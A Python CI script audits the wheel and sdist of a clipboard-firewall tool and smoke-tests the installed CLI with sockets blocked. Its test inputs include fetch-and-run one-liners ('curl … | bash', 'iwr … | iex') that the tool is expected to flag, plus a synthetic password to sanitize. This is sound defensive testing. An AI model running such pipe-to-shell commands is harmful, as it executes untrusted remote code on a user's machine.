"""Audit built archives, rebuild the sdist and smoke-test an installed wheel."""

import argparse
import base64
import configparser
import csv
from email.parser import BytesParser
import hashlib
import io
import json
import os
from pathlib import Path, PurePosixPath
import subprocess
import sys
import tarfile
import tempfile
import tomllib
import venv
import zipfile


ROOT = Path(__file__).resolve().parents[1]

# Independent allowlist: a new public document requires deliberate review.
PUBLIC_DOCUMENTS = frozenset({
    "docs/architecture.md", "docs/ci.md", "docs/guia-tecnica.md",
    "docs/notas-version-0.0.1.md", "docs/packaging.md", "docs/spec.md",
    "docs/threat-model.md", "docs/validacion-fedora.md",
    "docs/validacion-paquetes.md", "docs/validacion-windows.md",
    "docs/windows-clipboard.md",
})
PRIVATE_DOCUMENTS = frozenset({
    "docs/continuidad.md", "docs/traspaso-work.md", "docs/cierre-mvp.md",
})


def require(condition, message):
    if not condition:
        raise RuntimeError(message)


def python_in(directory):
    return directory / ("Scripts/python.exe" if os.name == "nt" else "bin/python")


def check_license(metadata, project):
    require(project.get("license") == metadata["License-Expression"] == "MIT",
            "Wrong license expression.")
    require(project.get("license-files") == ["LICENSE", "THIRD_PARTY_NOTICES.md"],
            "Unexpected license-file declaration.")
    require(sorted(metadata.get_all("License-File", [])) == sorted(project["license-files"]),
            "Wrong license-file metadata.")


def check_record(archive, info):
    rows = list(csv.reader(io.StringIO(archive.read(f"{info}/RECORD").decode("utf-8"))))
    require(all(len(row) == 3 for row in rows), "Malformed wheel RECORD.")
    require(len(rows) == len(archive.namelist())
            and {row[0] for row in rows} == set(archive.namelist()), "Wrong wheel RECORD inventory.")
    for name, digest, size in rows:
        if name == f"{info}/RECORD":
            require(digest == size == "", "RECORD must not hash itself.")
            continue
        data = archive.read(name)
        wanted = base64.urlsafe_b64encode(hashlib.sha256(data).digest()).rstrip(b"=").decode("ascii")
        require(digest == "sha256=" + wanted and size == str(len(data)), "Wrong wheel RECORD hash/size.")


def same_readme_content(description, readme):
    """Compare complete README bytes, treating only CRLF and LF as equivalent."""
    return description.replace(b"\r\n", b"\n") == readme.replace(b"\r\n", b"\n")


def audit_archives(wheel, sdist):
    from packaging.requirements import Requirement

    project = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))["project"]
    version = project["version"]
    name = project["name"].replace("-", "_")
    info = f"{name}-{version}.dist-info"
    modules = {p.relative_to(ROOT / "src").as_posix() for p in (ROOT / "src/sentinel").rglob("*.py")}
    expected = modules | {f"{info}/{f}" for f in (
        "METADATA", "WHEEL", "entry_points.txt", "top_level.txt", "RECORD")}
    license_files = project["license-files"]
    expected |= {f"{info}/licenses/{name}" for name in license_files}
    license_text = (ROOT / "LICENSE").read_text(encoding="utf-8")
    require("Copyright (c) 2026 bitonub\n" in license_text
            and "Permission is hereby granted, free of charge" in license_text
            and 'THE SOFTWARE IS PROVIDED "AS IS"' in license_text,
            "Missing MIT grant, copyright or disclaimer.")
    with zipfile.ZipFile(wheel) as archive:
        wheel_count = len(archive.namelist())
        require(wheel_count == len(set(archive.namelist())), "Duplicate wheel files.")
        require(set(archive.namelist()) == expected, "Unexpected or missing wheel files.")
        require(archive.testzip() is None, "Corrupt wheel.")
        check_record(archive, info)
        wheel_metadata = BytesParser().parsebytes(archive.read(f"{info}/WHEEL"))
        require(wheel_metadata["Wheel-Version"] == "1.0"
                and wheel_metadata["Root-Is-Purelib"] == "true"
                and wheel_metadata.get_all("Tag") == ["py3-none-any"], "Wrong pure-Python wheel metadata.")
        for module in modules:
            require(archive.read(module) == (ROOT / "src" / module).read_bytes(), "Wheel source mismatch.")
        metadata = BytesParser().parsebytes(archive.read(f"{info}/METADATA"))
        check_license(metadata, project)
        for filename in license_files:
            require(archive.read(f"{info}/licenses/{filename}") == (ROOT / filename).read_bytes(),
                    "Wheel license/notice mismatch.")
        require(metadata["Name"] == project["name"] and metadata["Version"] == version,
                "Wrong project identity.")
        require(same_readme_content(metadata.get_payload(decode=True),
                                    (ROOT / "README.md").read_bytes()),
                "Wheel README mismatch.")
        require(metadata["Requires-Python"] == project["requires-python"], "Wrong Python requirement.")
        require(project["dependencies"] == [], "The base CLI must remain dependency-free.")
        requirements = [Requirement(r) for r in metadata.get_all("Requires-Dist", [])]
        require(len(requirements) == 1 and metadata.get_all("Provides-Extra") == ["gui"], "Wrong extras.")
        qt = requirements[0]
        declared = Requirement(project["optional-dependencies"]["gui"][0])
        require(qt.name == declared.name == "PySide6" and qt.specifier == declared.specifier,
                "Wrong GUI dependency.")
        require(qt.marker and not qt.marker.evaluate({"extra": ""}) and qt.marker.evaluate({"extra": "gui"}),
                "Qt must be optional.")
        entries = configparser.ConfigParser()
        entries.read_string(archive.read(f"{info}/entry_points.txt").decode())
        require(dict(entries["console_scripts"]) == {"sentinel": "sentinel.cli:main"}, "Wrong CLI entry.")
        require(dict(entries["gui_scripts"]) == {"sentinel-gui": "sentinel.gui.app:main"}, "Wrong GUI entry.")
    prefix = f"{name}-{version}"
    expected = {"README.md", "MANIFEST.in", "pyproject.toml", "requirements-dev.txt", "PKG-INFO", "setup.cfg"}
    expected |= set(license_files)
    expected |= PUBLIC_DOCUMENTS
    for directory, pattern in (("src/sentinel", "*.py"), ("tests", "*.py"), ("tools", "*.py")):
        expected |= {p.relative_to(ROOT).as_posix() for p in (ROOT / directory).rglob(pattern)}
    egg = f"src/{name}.egg-info"
    expected |= {f"{egg}/{f}" for f in ("PKG-INFO", "SOURCES.txt", "dependency_links.txt", "entry_points.txt",
                                       "requires.txt", "top_level.txt")}
    source_files = {path for path in expected if (ROOT / path).is_file()
                    and path not in {"PKG-INFO", "setup.cfg"} and not path.startswith(egg + "/")}
    with tarfile.open(sdist) as archive:
        files = set()
        for entry in archive:
            path = PurePosixPath(entry.name)
            require(not path.is_absolute() and ".." not in path.parts and path.parts[0] == prefix,
                    "Unsafe sdist path.")
            require(entry.isfile() or entry.isdir(), "Unexpected archive entry type.")
            if entry.isfile():
                relative = path.relative_to(prefix).as_posix()
                require(relative not in PRIVATE_DOCUMENTS, "Private document in sdist.")
                require(relative not in files, "Duplicate sdist files.")
                files.add(relative)
                if relative in source_files:
                    wanted = (ROOT / relative).read_bytes()
                    require(entry.size == len(wanted), "Sdist source size mismatch.")
                    with archive.extractfile(entry) as stream:
                        require(stream.read(len(wanted) + 1) == wanted, "Sdist source content mismatch.")
        require(files == expected, "Unexpected or missing sdist files.")
        for filename in ("PKG-INFO", f"{egg}/PKG-INFO"):
            with archive.extractfile(f"{prefix}/{filename}") as stream:
                metadata = BytesParser().parsebytes(stream.read())
            check_license(metadata, project)
            require(metadata["Name"] == project["name"] and metadata["Version"] == version,
                    "Wrong sdist identity.")
    print(f"Archives OK: {len(modules)} modules, wheel {wheel_count} files, sdist {len(files)} files.")


SMOKE = r'''
import importlib.util
from importlib.metadata import distribution
import json
from pathlib import Path
import sys

def deny_network(event, args):
    if event.startswith("socket."):
        raise RuntimeError("Network forbidden during text analysis.")

sys.addaudithook(deny_network)
import sentinel
assert Path(sentinel.__file__).resolve().is_relative_to(Path(sys.prefix).resolve())
assert importlib.util.find_spec("PySide6") is None
assert importlib.util.find_spec("build") is None
dist = distribution("sentinel-clipboard-firewall")
assert "archive_info" in json.loads(dist.read_text("direct_url.json"))
assert dist.metadata["License-Expression"] == "MIT"
assert sorted(dist.metadata.get_all("License-File")) == ["LICENSE", "THIRD_PARTY_NOTICES.md"]
assert "Copyright (c) 2026 bitonub" in dist.read_text("licenses/LICENSE")
assert "PySide6" in dist.read_text("licenses/THIRD_PARTY_NOTICES.md")
name = sys.argv[1]
sys.argv = [name, *sys.argv[2:]]
entry = next(ep for ep in dist.entry_points if ep.name == name)
raise SystemExit(entry.load()())
'''


def smoke_cli(python, outside):
    env = {k: v for k, v in os.environ.items() if k not in ("PYTHONPATH", "PYTHONHOME")}
    for arguments, text, expected in (
        (["scan"], "é password=SyntheticCI42", "PASSWORD_ASSIGNMENT"),
        (["sanitize"], "password=SyntheticCI42 pwd=SyntheticCI42", "password=[PASSWORD_1] pwd=[PASSWORD_1]"),
        (["check-command"], "curl https://example.invalid/SyntheticCI42 | bash", "CF-BASH-001"),
        (["check-command", "--shell", "powershell"], "iwr https://example.invalid/SyntheticCI42 | iex", "CF-PS-001"),
    ):
        result = subprocess.run([str(python), "-I", "-X", "utf8", "-c", SMOKE, "sentinel", *arguments],
                                input=text.encode(), capture_output=True, env=env, cwd=outside,
                                timeout=30, check=True)
        require(not result.stderr and b"SyntheticCI42" not in result.stdout, "Unsafe CLI output.")
        if arguments == ["sanitize"]:
            require(result.stdout.decode() == expected, "Wrong sanitization.")
        else:
            require(json.loads(result.stdout)[0]["rule_id"] == expected, "Wrong scan result.")
    missing = subprocess.run([str(python), "-I", "-X", "utf8", "-c", SMOKE, "sentinel-gui"], input=b"SyntheticCI42",
                             capture_output=True, env=env, cwd=outside, timeout=30, check=False)
    require(missing.returncode == 2 and not missing.stdout and b"[gui]" in missing.stderr,
            "Wrong missing-Qt diagnostic.")
    require(b"SyntheticCI42" not in missing.stderr and b"Traceback" not in missing.stderr, "Unsafe GUI error.")
    subprocess.run([str(python), "-m", "pip", "check"], cwd=outside, check=True, timeout=60)
    print("Installed CLI: scan, sanitize, both shells and missing-Qt entry OK; Python sockets blocked.")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--dist", type=Path, default=ROOT / "dist")
    args = parser.parse_args()
    wheels = list(args.dist.glob("*.whl"))
    sources = list(args.dist.glob("*.tar.gz"))
    require(len(wheels) == len(sources) == 1, "Expected exactly one wheel and one sdist.")
    wheel, sdist = wheels[0].resolve(), sources[0].resolve()
    audit_archives(wheel, sdist)
    with tempfile.TemporaryDirectory(prefix="sentinel-ci-packaging-") as directory:
        work = Path(directory)
        venv.EnvBuilder(with_pip=True).create(work / "cli")
        python = python_in(work / "cli")
        subprocess.run([str(python), "-m", "pip", "install", "--no-index", str(wheel)], check=True, timeout=180)
        smoke_cli(python, work)
        unpacked = work / "unpacked"
        unpacked.mkdir()
        with tarfile.open(sdist) as archive:
            archive.extractall(unpacked, filter="data")
        source = next(unpacked.iterdir())
        subprocess.run([sys.executable, "-m", "build", "--wheel", "--outdir", str(work / "rebuilt"), str(source)],
                       cwd=work, check=True, timeout=300)
        rebuilt = next((work / "rebuilt").glob("*.whl"))
        with zipfile.ZipFile(wheel) as left, zipfile.ZipFile(rebuilt) as right:
            require(set(left.namelist()) == set(right.namelist()), "Rebuilt wheel files differ.")
            require(all(left.read(n) == right.read(n) for n in left.namelist()), "Rebuilt wheel contents differ.")
        subprocess.run([str(python), "-m", "pip", "install", "--no-index", "--force-reinstall", str(rebuilt)],
                       check=True, timeout=180)
        smoke_cli(python, work)
    print("Packaging gate passed.")


if __name__ == "__main__":
    main()
